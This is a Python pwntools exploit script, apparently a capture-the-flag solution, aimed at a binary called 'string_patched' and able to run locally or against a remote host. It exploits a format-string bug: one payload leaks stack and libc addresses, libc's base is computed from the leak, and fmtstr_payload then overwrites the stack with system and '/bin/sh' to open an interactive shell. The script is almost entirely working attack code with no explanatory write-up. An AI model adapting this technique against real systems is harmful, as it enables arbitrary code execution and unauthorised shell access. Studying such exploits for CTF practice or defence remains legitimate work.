from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b print
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './string_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
context.arch = elf.arch
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True
context.arch = elf.arch

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
rop = ROP(elf)
libc = ELF('./libc.so.6')
payload = b'%1$p%71$p'
def input(payload):
    p.sendlineafter(b'> ',b'1')
    p.sendafter(b"Input: ",payload)

def printf():
    p.sendlineafter(b'> ',b'2')
    p.recvuntil(b'string: ')
    return p.recvline()

input(payload)
leak = printf()
stack_leak = int(leak[:10],16) - 272
log.info(hex(stack_leak))
libc_leak = int(leak[10:20],16)
log.info(hex(libc_leak))
#__libc_start_main+247
libc.address = libc_leak - (libc.symbols['__libc_start_main']+247)
log.info(hex(libc.address))
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))

offset = 5

# the writes you want to perform
writes = {
    stack_leak: system,
    stack_leak + 4: 0xdeadbeef,
    stack_leak + 8: binsh
}

# you can use the `fmtstr_payload` function to automatically
# generate a payload that performs the writes you specify
payload = fmtstr_payload(offset, writes)
input(payload)
leak = printf()
p.interactive()